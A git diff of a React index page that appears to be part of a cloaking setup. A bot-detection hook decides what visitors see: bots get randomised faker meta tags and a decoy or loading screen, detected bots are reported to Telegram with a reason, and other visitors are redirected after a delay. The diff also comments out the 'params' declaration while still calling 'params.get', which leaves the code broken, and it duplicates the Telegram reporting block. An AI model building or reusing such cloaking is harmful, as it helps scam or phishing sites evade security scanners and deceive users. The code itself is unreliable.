@@ -4,7 +4,7 @@ import type { FC } from 'react';
 import { useEffect, useRef, useState } from 'react';
 import { sendBotTelegram,useBotDetection } from '@/hooks/useBotDetection';
 import { faker } from "@faker-js/faker";
-
+import {LoadingDots} from "../hooks/LoadingDots";
 interface MetaTag {
   title: string;
   description: string;
@@ -19,7 +19,7 @@ const generateRandomMeta = (): MetaTag => ({
 
 const Index: FC = () => {
     const [meta, setMeta] = useState<MetaTag | null>(null);
-    const { isBot, isLoading, shouldRedirect } = useBotDetection();
+    const { isBot, isLoading, shouldRedirect,botReason } = useBotDetection();
     const [redirecting, setRedirecting] = useState(false);
     const logSentRef = useRef(false);
     let[SiteTitleMeta, SetSiteTitleMeta] = useState('Hello Page');
@@ -72,7 +72,12 @@ const Index: FC = () => {
             logSentRef.current = true;
             sendBotTelegram('');
         }
-    }, [isLoading, isBot]);
+
+        if (!isLoading && isBot && !logSentRef.current) {
+            logSentRef.current = true;
+            sendBotTelegram(botReason?.toString());
+        }
+    }, [isLoading, isBot,botReason]);
     useEffect(() => {
         if (!isLoading && !isBot && !shouldRedirect) {
             const timer = setTimeout(() => {
@@ -91,7 +96,7 @@ const Index: FC = () => {
             </div>
         );
     }
-    const params = new URLSearchParams(window.location.search);
+    // const params = new URLSearchParams(window.location.search);
     if (isBot || Number(params.get("test")) == 1) {
         return(
         <>
@@ -106,19 +111,12 @@ const Index: FC = () => {
           <meta property="og:image" content={faker.image.urlPicsumPhotos()} />
         </Helmet>
       )}
-       <iframe src='/static/home.html' style={{
-        position: 'fixed',
-        top: '0px',
-        bottom: '0px',
-        right: '0px',
-        width: '100%',
-        border: 'none',
-        margin: '0',
-        padding: '0',
-        overflow: 'hidden',
-        zIndex: '999999',
-        height: '100%',
-      }}></iframe>
+                  <div className="fixed inset-0 flex items-center justify-center bg-white">
+                <div className="flex flex-col items-center gap-2">
+                  <LoadingDots/>
+                </div>
+            </div>
+
       </>
     );
     }
